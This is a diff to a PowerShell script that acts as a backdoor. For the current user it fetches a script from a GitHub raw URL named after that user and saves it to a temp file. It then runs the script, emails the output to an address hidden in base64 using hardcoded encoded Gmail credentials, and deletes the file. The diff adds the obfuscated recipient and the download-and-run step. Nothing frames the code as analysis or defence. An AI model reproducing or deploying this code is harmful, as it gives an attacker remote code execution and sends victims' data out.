@@ -1,4 +1,3 @@
-
 function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
     $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
     $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
@@ -28,23 +27,33 @@ function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
 }
 $name = $env:username
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
+$receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
 $statusCode = Get-UrlStatusCode $url
 if ($statusCode -eq 200){
     $contentLocal = "False"
     $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
     $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
     if($diff) {
+        $file="$env:tmp\cd.ps1"
         try {
-            $runn = & Invoke-Expression $contentWeb 2>&1 | Out-String
-            if($?){ $res=$contentWeb + "`n" + $runn; $don = "Done - "+$name; Send-ToEmail -email "xelil.isi007@gmail.com" -body $res -subj $don }
+            Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
+            $runn = powershell -file $file 2>&1 | Out-String
+            if($?){ 
+                $res=$contentWeb + [Environment]::NewLine + $runn
+                $don = "Done - "+$name; Send-ToEmail -email $receiver -body $res -subj $don
+
+            }
         } catch {
             $err = $_ | Out-String
             $suberr = "Error - "+$name
-            Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj $suberr
+            Send-ToEmail -email $receiver -body $err -subj $suberr
+        }
+        finally {
+            Remove-Item -Path $file -Force
         }
     }
 } else {
-    Send-ToEmail -email "xelil.isi007@gmail.com" -body $name -subj "UserNotFound"
+    Send-ToEmail -email $receiver -body $name -subj "UserNotFound"
 }
-
+# $runn = & Invoke-Expression $contentWeb 2>&1 | Out-String
 # Invoke-Expression $contentWeb -ErrorAction Stop
